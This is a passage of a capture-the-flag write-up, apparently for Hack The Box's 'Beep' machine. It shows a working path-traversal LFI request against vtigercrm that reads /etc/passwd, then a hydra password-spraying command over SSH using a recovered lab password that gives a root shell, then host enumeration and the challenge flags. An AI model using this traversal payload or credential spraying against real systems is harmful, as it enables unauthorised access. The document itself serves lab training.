+<h3 id="lfi-1">LFI</h3>
+<p>Let's use our LFI to get a list of Beep's local users:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;module=Accounts&amp;action<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">asterisk
+</span><span class="z-text z-plain">cyrus
+</span><span class="z-text z-plain">fanis
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">spamfilter
+</span></code></pre>
+<p>I'll save these usernames in a <code>users</code> file.</p>
+<h3 id="password-spraying">Password spraying</h3>
+<p>Let's try the password we discovered previously for each of these users to log
+in over SSH. It would be pretty quick to do it by hand, but let's get fancy and
+use <code>hydra</code> instead.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> hydra<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>L</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/users<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>jEhdIekWmdjE<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.10.7<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ssh<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>This password is valid for <code>root</code>!</p>
+<p>I'll connect to Beep over SSH as this user to get a shell.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>root</code> (obviously).</p>
+<p>I could just retrieve the flags and call it a day, but for good measure I'll
+still enumerate basic information.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Beep's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">i686
+</span></code></pre>
+<p>It's using i686. Let's keep that in mind to select the appropriate binaries.</p>
+<h3 id="distribution">Distribution</h3>
+<p>Let's see which distribution Beep is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/redhat-release<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">CentOS release 5.6 (Final)
+</span></code></pre>
+<p>Okay, so it's CentOS 5.6.</p>
+<h3 id="kernel">Kernel</h3>
+<p>Let's find the kernel version of Beep.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">2.6.18-238.12.1.el5
+</span></code></pre>
+<p>It's <code>2.6.18</code>.</p>
+<h3 id="users">Users</h3>
+<p>Let's enumerate all users.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# grep <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>.*sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/passwd<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">cyrus
+</span><span class="z-text z-plain">fanis
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">spamfilter
+</span></code></pre>
+<p>There's a few of them, but only <code>cyrus</code>, <code>fanis</code> and <code>root</code> look like real
+users.</p>
+<h3 id="groups">Groups</h3>
+<p>Let's enumerate all groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/group<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>:<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">apache
+</span><span class="z-text z-plain">asterisk
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dbus
+</span><span class="z-text z-plain">dip
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">distcache
+</span><span class="z-text z-plain">fanis
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">ftp
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gopher
+</span><span class="z-text z-plain">haldaemon
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">lock
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">mailman
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">mem
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">news
+</span><span class="z-text z-plain">nfsnobody
+</span><span class="z-text z-plain">nobody
+</span><span class="z-text z-plain">ntp
+</span><span class="z-text z-plain">pcap
+</span><span class="z-text z-plain">postdrop
+</span><span class="z-text z-plain">postfix
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">rpc
+</span><span class="z-text z-plain">rpcuser
+</span><span class="z-text z-plain">saslauth
+</span><span class="z-text z-plain">spamfilter
+</span><span class="z-text z-plain">sshd
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utempter
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">uucp
+</span><span class="z-text z-plain">vcsa
+</span><span class="z-text z-plain">wheel
+</span><span class="z-text z-plain">xfs
+</span></code></pre>
+<h3 id="nics">NICs</h3>
+<p>Let's gather the list of connected NICs.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# ifconfig</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:42:F0  
+</span><span class="z-text z-plain">          inet addr:10.10.10.7  Bcast:10.10.10.255  Mask:255.255.255.0
+</span><span class="z-text z-plain">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span><span class="z-text z-plain">          RX packets:76670 errors:0 dropped:0 overruns:0 frame:0
+</span><span class="z-text z-plain">          TX packets:74375 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class="z-text z-plain">          collisions:0 txqueuelen:1000 
+</span><span class="z-text z-plain">          RX bytes:5492526 (5.2 MiB)  TX bytes:7155123 (6.8 MiB)
+</span><span class="z-text z-plain">          Interrupt:59 Base address:0x2024 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">lo        Link encap:Local Loopback  
+</span><span class="z-text z-plain">          inet addr:127.0.0.1  Mask:255.0.0.0
+</span><span class="z-text z-plain">          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+</span><span class="z-text z-plain">          RX packets:1652 errors:0 dropped:0 overruns:0 frame:0
+</span><span class="z-text z-plain">          TX packets:1652 errors:0 dropped:0 overruns:0 carrier:0
+</span><span class="z-text z-plain">          collisions:0 txqueuelen:0 
+</span><span class="z-text z-plain">          RX bytes:139197 (135.9 KiB)  TX bytes:139197 (135.9 KiB)
+</span></code></pre>
+<p>There's an Ethernet interface and the loopback interface.</p>
+<h3 id="hostname">Hostname</h3>
+<p>What is Beep's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">beep
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check <code>fanis</code>'s home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/fanis/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">73d602d78b2a3ad594ad634f4f6f1fd5
+</span></code></pre>
+<p>And as usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[root@beep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]# cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">e6444d9d4d815cf42976aa5480e820e3
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/beep/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Not too easy' and the root flag as 'Piece of cake'.
+Since the website didn't disclose the version of Elastix in use, I had to try a
+few exploits before finding a valid one, so it was not that straightforward.
+Furthermore, it was a LFI and not a RCE, so I had to read a specific file to get
+credentials (luckily the same file as in the PoC), and then use them to connect
+to Beep over SSH. Conversely, the privilege escalation was a piece of cake,
+since we actually directly got a shell as <code>root</code>.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
